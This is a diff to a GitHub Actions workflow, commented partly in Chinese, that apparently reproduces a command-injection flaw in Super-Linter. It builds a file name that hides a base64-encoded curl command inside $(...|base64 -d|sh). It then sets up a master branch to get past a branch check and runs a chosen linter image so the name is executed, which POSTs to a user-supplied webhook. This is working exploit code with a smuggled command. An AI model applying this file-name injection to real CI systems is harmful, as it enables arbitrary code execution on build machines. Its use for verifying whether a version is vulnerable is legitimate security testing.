@@ -18,46 +18,36 @@ jobs:
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
+        with:
+          # 必须拉取完整历史，否则 checkout -b 可能会出问题（虽然通常不用，但为了保险）
+          fetch-depth: 0
 
       - name: 1. Generate Malicious Filename (The Exploit)
         run: |
-          # 1. 定义我们要执行的攻击命令（包含斜杠，不能直接做文件名）
+          # 构造 Payload
           ATTACK_CMD="curl -fsS -X POST \"${{ inputs.webhook_url }}\" -d \"vulnerable_version=${{ inputs.target_version }}\""
-          
-          # 2. 将命令进行 Base64 编码，消除特殊字符和斜杠
-          # -w0 确保不换行
           ENCODED_CMD=$(echo -n "$ATTACK_CMD" | base64 -w0)
           
-          # 3. 构造文件名
-          # 这里的逻辑是：文件名包含 $(echo ... | base64 -d | sh)
-          # 当漏洞触发时，它会解码并执行 sh，从而还原之前的 curl 命令
+          # Base64 编码文件名，避免路径斜杠报错
           PAYLOAD="pre\$(echo $ENCODED_CMD|base64 -d|sh).md"
           
-          echo "Encoded Payload: $PAYLOAD"
-          
-          # 4. 创建文件（现在这是一个合法的文件名了，不含路径分隔符）
+          echo "Payload Filename: $PAYLOAD"
           touch "$PAYLOAD"
-          
-          # 验证文件是否创建成功
-          ls -la
 
-      # - name: 2. Run Super-Linter (Target Version)
-      #   # We allow this step to fail because the linter might error out, 
-      #   # but the injection happens during file discovery/initialization.
-      #   continue-on-error: true 
-      #   uses: super-linter/super-linter/slim@main # This is a placeholder
-      #   # dynamic uses is not supported directly in GHA, so we use a different approach below
-      #   # OR simply ask them to edit the 'uses' line. 
-      #   # But actually, simpler approach for them:
-        
-      # Since we can't dynamically variable-ize the 'uses' clause in GitHub Actions easily,
-      # strict reproduction usually asks them to hardcode the version, OR we use docker run manually.
-      # But to respect your "Action context" requirement, let's use the docker container directly 
-      # which mimics the action's behavior closely.
-      
-      - name: 2. Run Super-Linter via Docker (Exact Reproduction)
+      - name: 2. Fix Git Environment (Critical Step)
+        run: |
+          # 【关键修复】
+          # Super-Linter 的 InitializeDefaultBranch 函数在 RUN_LOCAL=true 时强行检查 'master' 分支。
+          # GHA checkout 默认是 Detached HEAD，所以我们手动创建一个 master 分支来欺骗它。
+          git checkout -b master
+          
+      - name: 3. Run Super-Linter via Docker
         run: |
           echo "Testing against image version: ${{ inputs.target_version }}"
+          
+          # 1. RUN_LOCAL=true: 必须开启，否则脚本会尝试读取 GHA Event JSON，导致更复杂的报错。
+          # 2. VALIDATE_ALL_CODEBASE=true: 告诉它不要去算 Diff，而是扫描所有文件（直接触发 find）。
+          #    虽然上面的函数没用到这个变量，但主流程里需要它来跳过 git diff 计算。
           
           docker run --rm \
             -e RUN_LOCAL=true \
@@ -66,7 +56,7 @@ jobs:
             -v "$(pwd):/tmp/lint" \
             ghcr.io/super-linter/super-linter:${{ inputs.target_version }}
             
-      - name: 3. Check Result
+      - name: 4. Check Result
+        if: always()
         run: |
-          echo "Please check your Webhook URL: ${{ inputs.webhook_url }}"
-          echo "If you received a POST request, version ${{ inputs.target_version }} is VULNERABLE."
+          echo "Test finished. Please check ${{ inputs.webhook_url }} for the ping."
